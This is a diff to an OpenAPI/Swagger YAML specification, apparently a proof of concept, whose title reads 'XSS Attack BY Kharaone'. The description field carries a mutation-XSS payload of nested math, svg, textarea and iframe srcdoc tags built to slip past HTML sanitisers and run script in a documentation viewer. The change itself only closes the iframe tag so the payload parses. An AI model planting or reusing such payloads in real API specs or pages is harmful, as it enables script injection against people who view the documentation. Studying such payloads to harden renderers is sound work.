@@ -8,7 +8,7 @@ securityDefinitions:
 info:
   title: XSS Attack BY Kharaone
   description: |
-    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script>alert(document.domain)</script>"
+    <math><mtext><option><FAKEFAKE><option></option><mglyph><svg><mtext><mtext><textarea><desc id="</textarea><math><mtext><!--"><textarea id="--><iframe srcdoc="<script><script>alert(document.domain)</script>">
 
   version: production
 basePath: /JSSResource/
